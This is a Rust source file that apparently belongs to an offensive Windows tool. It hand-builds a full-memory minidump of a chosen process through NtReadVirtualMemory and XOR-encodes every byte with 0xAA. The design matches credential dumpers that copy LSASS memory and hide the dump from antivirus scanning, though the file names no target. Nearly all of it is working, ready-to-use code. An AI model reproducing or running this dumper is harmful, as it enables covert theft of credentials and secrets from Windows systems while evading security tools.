#![allow(deprecated, non_snake_case, unused_unsafe, unused_variables)]
use std::{
    intrinsics::{copy_nonoverlapping, write_bytes},
    mem::zeroed,
    os::raw::c_void,
    ptr::null_mut,
};

use windows_sys::{
    Wdk::System::SystemInformation::NtQuerySystemInformation,
    Win32::{
        Foundation::STATUS_INFO_LENGTH_MISMATCH,
        Storage::FileSystem::{
            FILE_BEGIN, GetFileVersionInfoSizeW, GetFileVersionInfoW, SetFilePointer,
            SetFilePointerEx, VS_FIXEDFILEINFO, VerQueryValueW, WriteFile,
        },
        System::{
            Diagnostics::Debug::{
                EnumerateLoadedModules64, IMAGE_NT_HEADERS64, MINIDUMP_CALLBACK_INFORMATION,
                MINIDUMP_DIRECTORY, MINIDUMP_HEADER, MINIDUMP_MEMORY_DESCRIPTOR64, MINIDUMP_MODULE,
                MINIDUMP_SYSTEM_INFO, MINIDUMP_TYPE, Memory64ListStream, MiniDumpWithFullMemory,
                MiniDumpWithFullMemoryInfo, MiniDumpWithUnloadedModules, ModuleListStream,
                SymCleanup, SymInitialize, SystemInfoStream,
            },
            Memory::{
                GetProcessHeap, HeapAlloc, HeapFree, HeapReAlloc, MEM_COMMIT,
                MEMORY_BASIC_INFORMATION, VirtualQueryEx,
            },
            ProcessStatus::GetModuleFileNameExW,
            SystemInformation::{GetSystemInfo, SYSTEM_INFO},
            SystemServices::{
                IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE, VER_SUITE_TERMINAL,
            },
            Threading::IsProcessorFeaturePresent,
            WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
        },
    },
};

use crate::NT_SUCCESS;

unsafe extern "system" {
    fn NtReadVirtualMemory(
        ProcessHandle: *mut c_void,
        BaseAddress: *mut c_void,
        Buffer: *mut c_void,
        BufferSize: usize,
        NumberOfBytesRead: *mut usize,
    ) -> i32;

    fn RtlGetNtVersionNumbers(
        MajorVersion: *mut u32,
        MinorVersion: *mut u32,
        BuildNumber: *mut u32,
    );
}

pub const MINIDUMP_SIGNATURE: u32 = u32::from_le_bytes(*b"MDMP");

#[repr(C)]
#[derive(Debug, Copy, Clone)]
struct process {
    handle: *mut c_void,
    dummy: i32,
}

#[repr(C)]
#[derive(Debug, Copy, Clone)]
struct dump_thread {
    tid: u32,
    prio_class: u32,
    curr_prio: u32,
}

#[repr(C)]
#[derive(Debug, Copy, Clone)]
struct dump_module {
    is_elf: u32,
    base: u64,
    size: u32,
    timestamp: u32,
    checksum: u32,
    name: [u16; 256],
}

#[repr(C)]
#[derive(Debug, Copy, Clone)]
struct dump_memory {
    base: u64,
    size: u32,
    rva: u32,
}

#[repr(C)]
#[derive(Debug, Copy, Clone)]
struct dump_memory64 {
    base: u64,
    size: u64,
}

#[repr(C)]
#[derive(Debug, Copy, Clone)]
struct dump_context {
    process: *mut process,
    pid: u32,
    handle: *mut c_void,
    threads: *mut dump_thread,
    num_threads: u32,
    modules: *mut dump_module,
    num_modules: u32,
    alloc_modules: u32,
    dump_type: MINIDUMP_TYPE,
    hfile: *mut c_void,
    rva: u32,
    mem: *mut dump_memory,
    num_mem: u32,
    alloc_mem: u32,
    mem64: *mut dump_memory64,
    num_mem64: u32,
    alloc_mem64: u32,
    cb: *mut MINIDUMP_CALLBACK_INFORMATION,
}

pub fn MiniDumpWriteDump(proc_handle: *mut c_void, pid: u32, file_handle: *mut c_void) -> bool {
    unsafe {
        let mut md_head = zeroed::<MINIDUMP_HEADER>();
        let mut md_dir = zeroed::<MINIDUMP_DIRECTORY>();

        let flags =
            MiniDumpWithFullMemory | MiniDumpWithFullMemoryInfo | MiniDumpWithUnloadedModules;

        let dump_type: MINIDUMP_TYPE = flags;

        if SymInitialize(proc_handle, null_mut(), 1) == 0 {
            println!("[-] Failed to initialize symbol handler");
            return false;
        }

        let mut dc = zeroed::<dump_context>();
        dc.hfile = file_handle;
        dc.pid = pid;
        dc.handle = proc_handle;
        dc.dump_type = flags;

        if !fetch_process_info(&mut dc) {
            return false;
        }

        fetch_modules_info(&mut dc);

        let mut n_streams = 3;
        n_streams = (n_streams + 3) & !3;

        md_head.Signature = MINIDUMP_SIGNATURE;
        md_head.Version = 42899;
        md_head.NumberOfStreams = n_streams;
        md_head.CheckSum = 0;
        md_head.StreamDirectoryRva = size_of::<MINIDUMP_HEADER>() as u32;
        md_head.Flags = dump_type as u64;
        append(
            &mut dc,
            &md_head as *const MINIDUMP_HEADER as *const c_void,
            size_of::<MINIDUMP_HEADER>(),
        );

        dc.rva += n_streams as u32 * size_of::<MINIDUMP_DIRECTORY>() as u32;
        let mut idx_stream = 0;

        md_dir.StreamType = SystemInfoStream as u32;
        md_dir.Location.Rva = dc.rva;
        md_dir.Location.DataSize = dump_system_info(&mut dc);
        writeat(
            &mut dc,
            md_head.StreamDirectoryRva + idx_stream * size_of::<MINIDUMP_DIRECTORY>() as u32,
            &md_dir as *const MINIDUMP_DIRECTORY as *const c_void,
            size_of::<MINIDUMP_DIRECTORY>(),
        );
        idx_stream += 1;

        md_dir.StreamType = ModuleListStream as u32;
        md_dir.Location.Rva = dc.rva;
        md_dir.Location.DataSize = dump_modules(&mut dc, false);
        writeat(
            &mut dc,
            md_head.StreamDirectoryRva + idx_stream * size_of::<MINIDUMP_DIRECTORY>() as u32,
            &md_dir as *const MINIDUMP_DIRECTORY as *const c_void,
            size_of::<MINIDUMP_DIRECTORY>(),
        );
        idx_stream += 1;

        fetch_memory64_info(&mut dc);
        md_dir.StreamType = Memory64ListStream as u32;
        md_dir.Location.Rva = dc.rva;
        md_dir.Location.DataSize = dump_memory64_info(&mut dc);
        writeat(
            &mut dc,
            md_head.StreamDirectoryRva + idx_stream * size_of::<MINIDUMP_DIRECTORY>() as u32,
            &md_dir as *const MINIDUMP_DIRECTORY as *const c_void,
            size_of::<MINIDUMP_DIRECTORY>(),
        );
        idx_stream += 1;

        let empty_dir = zeroed::<MINIDUMP_DIRECTORY>();
        for i in idx_stream..n_streams {
            writeat(
                &mut dc,
                md_head.StreamDirectoryRva + i * size_of::<MINIDUMP_DIRECTORY>() as u32,
                &empty_dir as *const MINIDUMP_DIRECTORY as *const c_void,
                size_of::<MINIDUMP_DIRECTORY>(),
            );
        }

        SymCleanup(proc_handle);

        let heap = GetProcessHeap();
        if !dc.mem.is_null() {
            HeapFree(heap, 0, dc.mem as *mut c_void);
        }
        if !dc.mem64.is_null() {
            HeapFree(heap, 0, dc.mem64 as *mut c_void);
        }
        if !dc.modules.is_null() {
            HeapFree(heap, 0, dc.modules as *mut c_void);
        }
        if !dc.threads.is_null() {
            HeapFree(heap, 0, dc.threads as *mut c_void);
        }
    }

    true
}

fn fetch_memory64_info(dc: *mut dump_context) {
    unsafe {
        let mut addr: u64 = 0;
        let mut mbi = zeroed::<MEMORY_BASIC_INFORMATION>();

        while VirtualQueryEx(
            (*dc).handle,
            addr as *const c_void,
            &mut mbi as *mut MEMORY_BASIC_INFORMATION,
            size_of::<MEMORY_BASIC_INFORMATION>(),
        ) != 0
        {
            if mbi.State == MEM_COMMIT {
                minidump_add_memory64_block(dc, mbi.BaseAddress as u64, mbi.RegionSize);
            }

            let next = (mbi.BaseAddress as u64).wrapping_add(mbi.RegionSize as u64);
            if next <= addr {
                break;
            }
            addr = next;
        }
    }
}

fn minidump_add_memory64_block(dc: *mut dump_context, base: u64, size: usize) {
    unsafe {
        if (*dc).mem64.is_null() {
            (*dc).alloc_mem64 = 32;
            (*dc).mem64 = HeapAlloc(
                GetProcessHeap(),
                0,
                (*dc).alloc_mem64 as usize * size_of::<dump_memory64>(),
            ) as *mut dump_memory64;
        } else if (*dc).num_mem64 >= (*dc).alloc_mem64 {
            (*dc).alloc_mem64 *= 2;
            (*dc).mem64 = HeapReAlloc(
                GetProcessHeap(),
                0,
                (*dc).mem64 as *mut c_void,
                (*dc).alloc_mem64 as usize * size_of::<dump_memory64>(),
            ) as *mut dump_memory64;
        }

        if !(*dc).mem64.is_null() {
            let entry = (*dc).mem64.add((*dc).num_mem64 as usize);
            (*entry).base = base;
            (*entry).size = size as u64;
            (*dc).num_mem64 += 1;
        } else {
            (*dc).num_mem64 = 0;
            (*dc).alloc_mem64 = 0;
        }
    }
}

fn dump_memory64_info(dc: *mut dump_context) -> u32 {
    unsafe {
        let sz = size_of::<u64>() * 2
            + (*dc).num_mem64 as usize * size_of::<MINIDUMP_MEMORY_DESCRIPTOR64>();
        let number_of_ranges: u64 = (*dc).num_mem64 as u64;
        let base_rva: u64 = (*dc).rva as u64 + sz as u64;

        append(
            dc,
            &number_of_ranges as *const u64 as *const c_void,
            size_of::<u64>(),
        );
        append(
            dc,
            &base_rva as *const u64 as *const c_void,
            size_of::<u64>(),
        );

        let rva_base = (*dc).rva;
        (*dc).rva += (*dc).num_mem64 * size_of::<MINIDUMP_MEMORY_DESCRIPTOR64>() as u32;

        let mut file_pos: i64 = (*dc).rva as i64;

        for i in 0..(*dc).num_mem64 as usize {
            let entry = &*(*dc).mem64.add(i);
            let md_mem64 = MINIDUMP_MEMORY_DESCRIPTOR64 {
                StartOfMemoryRange: entry.base,
                DataSize: entry.size,
            };

            SetFilePointerEx((*dc).hfile, file_pos, null_mut(), FILE_BEGIN);

            let tmp_size: usize = 4096;
            let mut tmp: Vec<u8> = vec![0u8; tmp_size];
            let mut written: u32 = 0;
            let mut pos: u64 = 0;

            while pos < entry.size {
                let len = std::cmp::min(entry.size - pos, tmp_size as u64) as usize;
                let mut bytes_read: usize = 0;
                let status = NtReadVirtualMemory(
                    (*dc).handle,
                    (entry.base + pos) as *mut c_void,
                    tmp.as_mut_ptr() as *mut c_void,
                    len,
                    &mut bytes_read,
                );

                if NT_SUCCESS(status) && bytes_read == len {
                    xor_aa(tmp.as_mut_ptr(), len);
                    WriteFile(
                        (*dc).hfile,
                        tmp.as_ptr(),
                        len as u32,
                        &mut written,
                        null_mut(),
                    );
                }
                pos += len as u64;
            }

            file_pos += md_mem64.DataSize as i64;

            writeat(
                dc,
                rva_base + (i as u32) * size_of::<MINIDUMP_MEMORY_DESCRIPTOR64>() as u32,
                &md_mem64 as *const MINIDUMP_MEMORY_DESCRIPTOR64 as *const c_void,
                size_of::<MINIDUMP_MEMORY_DESCRIPTOR64>(),
            );
        }

        return sz as u32;
    }
}

fn dump_modules(dc: *mut dump_context, dump_elf: bool) -> u32 {
    unsafe {
        let mut nmod: u32 = 0;
        for i in 0..(*dc).num_modules {
            let is_elf = (*(*dc).modules.add(i as usize)).is_elf != 0;
            if (is_elf && dump_elf) || (!is_elf && !dump_elf) {
                nmod += 1;
            }
        }

        let rva_base = (*dc).rva;
        let sz = size_of::<u32>() as u32 + size_of::<MINIDUMP_MODULE>() as u32 * nmod;
        (*dc).rva += sz;

        let mut bytes_written: u32 = 0;
        for i in 0..(*dc).num_modules {
            let module = &*(*dc).modules.add(i as usize);
            let is_elf = module.is_elf != 0;
            if (is_elf && !dump_elf) || (!is_elf && dump_elf) {
                continue;
            }

            let mut name_len: usize = 0;
            while name_len < module.name.len() && module.name[name_len] != 0 {
                name_len += 1;
            }
            let string_bytes_with_null = (name_len + 1) * 2;
            let length_field: u32 = (name_len * 2) as u32;

            let mut sbuf: Vec<u8> = Vec::with_capacity(size_of::<u32>() + string_bytes_with_null);
            sbuf.extend_from_slice(&length_field.to_ne_bytes());
            sbuf.extend_from_slice(std::slice::from_raw_parts(
                module.name.as_ptr() as *const u8,
                string_bytes_with_null,
            ));

            let mut md_module = zeroed::<MINIDUMP_MODULE>();
            md_module.BaseOfImage = module.base;
            md_module.SizeOfImage = module.size;
            md_module.CheckSum = module.checksum;
            md_module.TimeDateStamp = module.timestamp;
            md_module.ModuleNameRva = (*dc).rva;

            fetch_module_versioninfo(module.name.as_ptr(), &mut md_module.VersionInfo);

            md_module.CvRecord.DataSize = 0;
            md_module.CvRecord.Rva = 0;
            md_module.MiscRecord.DataSize = 0;
            md_module.MiscRecord.Rva = 0;
            md_module.Reserved0 = 0;
            md_module.Reserved1 = 0;

            append(dc, sbuf.as_ptr() as *const c_void, sbuf.len());

            writeat(
                dc,
                rva_base
                    + size_of::<u32>() as u32
                    + bytes_written * size_of::<MINIDUMP_MODULE>() as u32,
                &md_module as *const MINIDUMP_MODULE as *const c_void,
                size_of::<MINIDUMP_MODULE>(),
            );
            bytes_written += 1;
        }

        writeat(
            dc,
            rva_base,
            &nmod as *const u32 as *const c_void,
            size_of::<u32>(),
        );

        sz
    }
}

fn fetch_module_versioninfo(filename: *const u16, ffi: *mut VS_FIXEDFILEINFO) {
    unsafe {
        let mut handle: u32 = 0;
        let sz: u32 = GetFileVersionInfoSizeW(filename, &mut handle);

        write_bytes(ffi as *mut u8, 0, size_of::<VS_FIXEDFILEINFO>());

        if sz > 0 {
            let heap = GetProcessHeap();
            let info = HeapAlloc(heap, 0, sz as usize) as *mut c_void;

            if !info.is_null() && GetFileVersionInfoW(filename, handle, sz, info) != 0 {
                let mut ptr: *mut c_void = null_mut();
                let mut len: u32 = 0;
                let backslash: [u16; 2] = ['\\' as u16, 0];

                if VerQueryValueW(info, backslash.as_ptr(), &mut ptr, &mut len) != 0 {
                    let copy_len = std::cmp::min(len as usize, size_of::<VS_FIXEDFILEINFO>());
                    copy_nonoverlapping(ptr as *const u8, ffi as *mut u8, copy_len);
                }
            }

            if !info.is_null() {
                HeapFree(heap, 0, info);
            }
        }
    }
}

fn dump_system_info(dc: *mut dump_context) -> u32 {
    unsafe {
        let mut sys_info = zeroed::<SYSTEM_INFO>();
        GetSystemInfo(&mut sys_info);

        let mut dw_major: u32 = 0;
        let mut dw_minor: u32 = 0;
        let mut dw_build: u32 = 0;

        RtlGetNtVersionNumbers(&mut dw_major, &mut dw_minor, &mut dw_build);
        dw_build &= 0xFFFF;

        let mut md_sys_info = zeroed::<MINIDUMP_SYSTEM_INFO>();
        md_sys_info.ProcessorArchitecture = sys_info.Anonymous.Anonymous.wProcessorArchitecture;
        md_sys_info.ProcessorLevel = sys_info.wProcessorLevel;
        md_sys_info.ProcessorRevision = sys_info.wProcessorRevision;
        md_sys_info.Anonymous1.Anonymous.ProductType = 1;
        md_sys_info.MajorVersion = dw_major;
        md_sys_info.MinorVersion = dw_minor;
        md_sys_info.BuildNumber = dw_build;
        md_sys_info.PlatformId = 2;
        md_sys_info.CSDVersionRva = (*dc).rva + size_of::<MINIDUMP_SYSTEM_INFO>() as u32;
        md_sys_info.Anonymous2.Reserved1 = 0;
        md_sys_info.Anonymous2.Anonymous.SuiteMask = VER_SUITE_TERMINAL as u16;

        md_sys_info.Cpu.OtherCpuInfo.ProcessorFeatures[0] = 0;
        md_sys_info.Cpu.OtherCpuInfo.ProcessorFeatures[1] = 0;

        for i in 0..64 {
            if IsProcessorFeaturePresent(i) != 0 {
                md_sys_info.Cpu.OtherCpuInfo.ProcessorFeatures[0] |= 1 << i;
            }
        }

        append(
            dc,
            &md_sys_info as *const MINIDUMP_SYSTEM_INFO as *const c_void,
            size_of::<MINIDUMP_SYSTEM_INFO>(),
        );

        let slen: u32 = 0;
        let mut written: u32 = 0;
        WriteFile(
            (*dc).hfile,
            &slen as *const u32 as *const u8,
            size_of::<u32>() as u32,
            &mut written,
            null_mut(),
        );
        (*dc).rva += size_of::<u32>() as u32 + slen;

        size_of::<MINIDUMP_SYSTEM_INFO>() as u32
    }
}

fn xor_aa(input: *mut u8, size: usize) {
    unsafe {
        for i in 0..size {
            *input.add(i) ^= 0xAA;
        }
    }
}

fn append(dc: *mut dump_context, data: *const c_void, size: usize) {
    unsafe {
        writeat(dc, (*dc).rva, data, size);
        (*dc).rva += size as u32;
    }
}

fn writeat(dc: *mut dump_context, rva: u32, data: *const c_void, size: usize) {
    unsafe {
        let mut written: u32 = 0;

        SetFilePointer((*dc).hfile, rva as i32, null_mut(), FILE_BEGIN);

        let heap = GetProcessHeap();
        let buffer_copy = HeapAlloc(heap, 0, size) as *mut u8;
        if buffer_copy.is_null() {
            println!("[-] Failed to allocate memory for buffer copy");
            return;
        }
        copy_nonoverlapping(data as *const u8, buffer_copy, size);
        xor_aa(buffer_copy, size);

        WriteFile(
            (*dc).hfile,
            buffer_copy,
            size as u32,
            &mut written,
            null_mut(),
        );
        HeapFree(heap, 0, buffer_copy as *mut c_void);
    }
}

fn fetch_process_info(dc: *mut dump_context) -> bool {
    unsafe {
        let heap = GetProcessHeap();
        let mut buf_size: usize = 0x1000;
        let mut proc_info = HeapAlloc(heap, 0, buf_size) as *mut SYSTEM_PROCESS_INFORMATION;

        if proc_info.is_null() {
            println!("[-] Failed to allocate memory for process information");
            return false;
        }

        let mut status: i32;
        loop {
            status = NtQuerySystemInformation(
                5, // SystemProcessInformation
                proc_info as *mut c_void,
                buf_size as u32,
                null_mut(),
            );

            if status != STATUS_INFO_LENGTH_MISMATCH {
                break;
            }

            buf_size *= 2;

            proc_info = HeapReAlloc(heap, 0, proc_info as *mut c_void, buf_size)
                as *mut SYSTEM_PROCESS_INFORMATION;

            if proc_info.is_null() {
                println!("[-] Failed to reallocate memory for process information");
                return false;
            }
        }

        if !NT_SUCCESS(status) {
            println!("[-] Failed to query system information");
            HeapFree(heap, 0, proc_info as *mut c_void);
            return false;
        }

        let mut spi = proc_info;
        loop {
            let pid = (*spi).UniqueProcessId as usize as u32;

            if pid == (*dc).pid {
                (*dc).num_threads = (*spi).NumberOfThreads;
                let thread_size = (*dc).num_threads as usize * size_of::<dump_thread>();
                let thread_ptr = HeapAlloc(heap, 0, thread_size);
                if thread_ptr.is_null() {
                    println!("[-] Failed to allocate memory for threads");
                    HeapFree(heap, 0, proc_info as *mut c_void);
                    return false;
                }
                (*dc).threads = thread_ptr as *mut dump_thread;
                HeapFree(heap, 0, proc_info as *mut c_void);
                return true;
            }

            if (*spi).NextEntryOffset == 0 {
                break;
            }

            spi = (spi as *mut u8).add((*spi).NextEntryOffset as usize)
                as *mut SYSTEM_PROCESS_INFORMATION;
        }
        HeapFree(heap, 0, proc_info as *mut c_void);
        false
    }
}

fn fetch_modules_info(dc: *mut dump_context) {
    unsafe {
        EnumerateLoadedModules64(
            (*dc).handle,
            Some(fetch_pe_module_info_cb),
            &mut (*dc) as *mut dump_context as *mut c_void,
        );
    }
}

unsafe extern "system" fn fetch_pe_module_info_cb(
    name: *const u8,
    base: u64,
    size: u32,
    user: *const c_void,
) -> i32 {
    let dc: *mut dump_context = user as *mut dump_context;
    let mut nt_headers = unsafe { zeroed::<IMAGE_NT_HEADERS64>() };

    if !valid_addr64(base) {
        println!("[-] Invalid module base address: {:#x}", base);
        return 0;
    }

    unsafe {
        if pe_load_nt_header((*dc).handle, base, &mut nt_headers) {
            add_module(
                user as *mut dump_context,
                name,
                base,
                size as usize,
                (nt_headers).FileHeader.TimeDateStamp,
                (nt_headers).OptionalHeader.CheckSum,
                0,
            );
        }
    }

    1
}

fn valid_addr64(addr: u64) -> bool {
    if size_of::<usize>() == 4 && (addr >> 32) != 0 {
        return false;
    }
    true
}

fn pe_load_nt_header(
    proc_handle: *mut c_void,
    base: u64,
    nt_headers: *mut IMAGE_NT_HEADERS64,
) -> bool {
    unsafe {
        let mut dos_header = zeroed::<IMAGE_DOS_HEADER>();

        let status = NtReadVirtualMemory(
            proc_handle,
            base as *mut c_void,
            &mut dos_header as *mut IMAGE_DOS_HEADER as *mut c_void,
            size_of::<IMAGE_DOS_HEADER>(),
            null_mut(),
        );

        if !NT_SUCCESS(status) || dos_header.e_magic != IMAGE_DOS_SIGNATURE {
            println!("[-] Failed to read DOS header at {:#x}", base);
            return false;
        }

        let status = NtReadVirtualMemory(
            proc_handle,
            (base + dos_header.e_lfanew as u64) as *mut c_void,
            nt_headers as *mut c_void,
            size_of::<IMAGE_NT_HEADERS64>(),
            null_mut(),
        );

        if !NT_SUCCESS(status) || (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            println!("[-] Failed to read NT headers at {:#x}", base);
            return false;
        }
    }

    true
}

fn add_module(
    dc: *mut dump_context,
    name: *const u8,
    base: u64,
    size: usize,
    timestamp: u32,
    checksum: u32,
    is_elf: u32,
) -> bool {
    unsafe {
        if (*dc).modules.is_null() {
            (*dc).alloc_modules = 32;
            (*dc).modules = HeapAlloc(
                GetProcessHeap(),
                0,
                (*dc).alloc_modules as usize * size_of::<dump_module>(),
            ) as *mut dump_module;
        } else if (*dc).num_modules >= (*dc).alloc_modules {
            (*dc).alloc_modules *= 2;
            (*dc).modules = HeapReAlloc(
                GetProcessHeap(),
                0,
                (*dc).modules as *mut c_void,
                (*dc).alloc_modules as usize * size_of::<dump_module>(),
            ) as *mut dump_module;
        }

        if (*dc).modules.is_null() {
            (*dc).alloc_modules = 0;
            (*dc).num_modules = 0;
            return false;
        }

        let module = (*dc).modules.add((*dc).num_modules as usize);
        GetModuleFileNameExW(
            (*dc).handle,
            base as *mut c_void,
            (*module).name.as_mut_ptr(),
            (*module).name.len() as u32,
        );

        (*module).base = base;
        (*module).size = size as u32;
        (*module).timestamp = timestamp;
        (*module).checksum = checksum;
        (*module).is_elf = is_elf;

        (*dc).num_modules += 1;
    }

    true
}
